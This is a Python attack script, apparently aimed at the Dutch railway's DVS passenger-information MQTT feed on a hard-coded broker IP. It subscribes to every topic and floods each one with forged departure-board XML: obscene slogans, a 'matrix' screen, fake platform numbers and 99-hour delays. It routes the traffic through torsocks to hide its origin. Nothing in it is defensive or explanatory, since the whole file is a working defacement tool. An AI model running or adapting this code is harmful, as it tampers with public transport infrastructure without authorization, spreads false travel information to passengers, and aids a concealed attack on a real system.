#!/usr/bin/env python3
"""
NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.2
FORCE ATTACK ALL TOPICS - NO MORE GENERIC
"""

import paho.mqtt.client as mqtt
import threading
import time
import subprocess
import random

HOST = "78.47.35.220"
PORT = 1883
WILDCARD_TOPIC = "#"

MESSAGES = [
    "TRUSTEDF57 FUCK MARTHA ROOT FUCK SOCIETY MORON",
    "TRUSTEDF57 VI FOTTE LE MADRI -TRUSTEDF57 FUCK YOUR ASS"
]

class DVSMatrixHack:
    def __init__(self):
        self.discovered_topics = {}
        self.topic_count = 0
        self.attack_count = 0
        self.tor_count = 0
        self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９█▓▒░"
    
    def tor_rotate(self):
        self.tor_count += 1
        if self.tor_count % 15 == 0:
            print(f"🔄 TORSOCKS ROTATION #{self.tor_count//15}")
            subprocess.run(["pkill", "-f", "mosquitto_pub"], capture_output=True)
    
    def generate_matrix_screen(self):
        matrix_lines = []
        center_msg = MESSAGES[0]
        for i in range(10):
            line = ''.join(random.choices(self.matrix_chars, k=40))
            if i == 5:
                pad_left = (40 - len(center_msg)) // 2
                line = ' ' * pad_left + center_msg + ' ' * (40 - len(center_msg) - pad_left)
            matrix_lines.append(line)
        return '\n'.join(matrix_lines)
    
    def audio_payload(self):
        msg = random.choice(MESSAGES)
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>TRUSTEDF57</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{msg}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">AUDIO TABELLONE HACK SUCCESSO</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def matrix_visual_payload(self):
        matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
        msg2 = MESSAGES[1]
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>MATRIXHACK</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{matrix_text[:390]}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">{msg2}</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
<ns2:TreinVertrekSpoor InfoStatus="Actueel">
<ns2:SpoorNummer>666</ns2:SpoorNummer>
</ns2:TreinVertrekSpoor>
<ns2:ExacteVertrekVertraging>PT99H</ns2:ExacteVertrekVertraging>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def publish_attack(self, topic, payload, attack_type):
        self.tor_rotate()
        cmd = [
            "torsocks", "mosquitto_pub",
            "-h", HOST, "-p", str(PORT),
            "-t", topic, "-m", payload
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=6)
            if result.returncode == 0:
                self.attack_count += 1
                print(f"✅ #{self.attack_count} {attack_type} → {topic[-25:]}")
                return True
        except:
            pass
        return False
    
    def full_attack(self, topic):
        # AUDIO
        self.publish_attack(topic, self.audio_payload(), "AUDIO")
        time.sleep(0.3)
        # MATRIX
        self.publish_attack(topic, self.matrix_visual_payload(), "MATRIX")
        time.sleep(0.3)
        # BINARI 999
        bin_payload = self.matrix_visual_payload().replace("666", "999")
        self.publish_attack(topic, bin_payload, "BINARI 999")
    
    def on_message(self, client, userdata, msg):
        """FORCE ATTACK SU OGNI TOPIC - NO FILTER"""
        topic = msg.topic
        if topic in self.discovered_topics:
            return
            
        self.discovered_topics[topic] = True
        self.topic_count += 1
        
        print(f"🎯 #{self.topic_count} LIVE ATTACK → {topic[-60:]}")
        
        # ATTACCO SU TUTTI I TOPIC
        threading.Thread(target=self.full_attack, args=(topic,), daemon=True).start()
    
    def start(self):
        client = mqtt.Client()
        client.on_message = self.on_message
        client.connect(HOST, PORT, 60)
        client.subscribe(WILDCARD_TOPIC, qos=2)
        
        print("""
╔══════════════════════════════════════════════════════╗
║       NS DVS v2.2 FORCE ATTACK ALL TOPICS            ║
║           TRUSTEDF57 - NO MORE GENERIC               ║
║    MATRIX + AUDIO + BINARI su OGNI topic live        ║
╚══════════════════════════════════════════════════════╝
        """)
        
        client.loop_forever()

if __name__ == "__main__":
    hack = DVSMatrixHack()
    hack.start()
